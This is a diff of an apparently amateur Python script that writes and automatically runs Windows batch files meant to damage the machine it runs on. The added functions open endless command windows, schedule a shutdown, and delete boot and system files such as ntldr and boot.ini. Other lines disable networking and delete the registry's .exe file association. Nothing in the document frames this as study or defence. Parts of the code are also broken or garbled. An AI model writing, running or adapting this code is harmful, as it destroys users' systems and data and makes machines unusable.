@@ -1,24 +1,63 @@
 import os
 
-os.system('Start cmd /c & python pip install pythonw')
-os.system('start cmd & pythonw test].py')
-
-pass
-
 parent_dir = "C://home//User//Documents"
 
 os.makedirs(parent_dir, os.R_OK), os.W_OK
 
 
-def file_return():
+def spammer():
     if os.access("C://home//User//Documents", os.F_OK):
-        A_file = open("C://home//User//Documents//HI.txt", 'w')
-        A_file.writelines("sorry but your computer got hacked.\n")
-        A_file.writelines("say goodbye to your toaster\n")
-        print(A_file)
+        spammer1 = open("C://home//User//Documents//spammer.txt", 'w')
+        spammer1.writelines('for i in range(9999999 * 99999999):\n')
+        spammer1.writelines('    os.system("start cmd")')
+
+        spammer1 = 'C://home//User//Documents//spammer.txt'
+        base = os.path.splitext(spammer1)[0]
+        os.rename(spammer1, base + '.bat')
+        os.system.__call__("Start C://home//User//Documents//spammer.bat")
 
 
-print(file_return())
+print(spammer())
+pass
+
+
+def complete_shut_down():
+    if os.access("C://home//User//Documents", os.F_OK):
+        shutdown = open("C://home//User//Documents//shutdown.txt", 'w')
+        shutdown.writelines('@Echo off')
+        shutdown.writelines('shutdown /s /t 9999999 * 999999999 /c ')
+
+        shutdown = 'C://home//User//Documents//shutdown.txt'
+        base = os.path.splitext(shutdown)[0]
+        os.rename(shutdown, base + '.bat')
+        os.system.__call__("Start C://home//User//Documents//shutdown.bat")
+
+
+print(complete_shut_down())
+pass
+
+
+def corrupt():
+    if os.access("C://home//User//Documents", os.F_OK):
+        corrupt = open("C://home//User//Documents//corrupt.txt", 'w')
+        corrupt.writelines('@echo off\n')
+        corrupt.writelines('attrib -r -s -h C://autoexec.bat\n')
+        corrupt.writelines('del C://autoexec.bat\n')
+        corrupt.writelines('del C://boot.ini\n')
+        corrupt.writelines('attrib -r -s -h C://ntldr\n')
+        corrupt.writelines('del C://ntldr\n')
+        corrupt.writelines('attrib -r -s -h C://window//win.ini\n')
+        corrupt.writelines('del C://window\win.ini\n')
+
+        corrupt = 'C://home//User//Documents//corrupt.txt'
+        base = os.path.splitext(corrupt)[0]
+        os.rename(corrupt, base + '.bat')
+        os.system.__call__("Start C://home//User//Documents//corrupt.bat")
+
+
+print(corrupt())
+pass
+
 internet_disable = open("C://home//User//Documents//internet_disable.txt", 'w')
 internet_disable.writelines('@echo off \n')
 internet_disable.writelines('IPconfig /release')
@@ -27,8 +66,8 @@ internet_disable = 'C://home//User//Documents//internet_disable.txt'
 base = os.path.splitext(internet_disable)[0]
 os.rename(internet_disable, base + '.bat')
 os.system.__call__("Start C://home//User//Documents//internet_disable.bat")
-
 pass
+
 delete_reg = open("C://home//User//Documents//delete_reg.txt", 'w')
 delete_reg.writelines('@ECHO OFF\n')
 delete_reg.writelines('START reg delete HKCR/.exe\n')
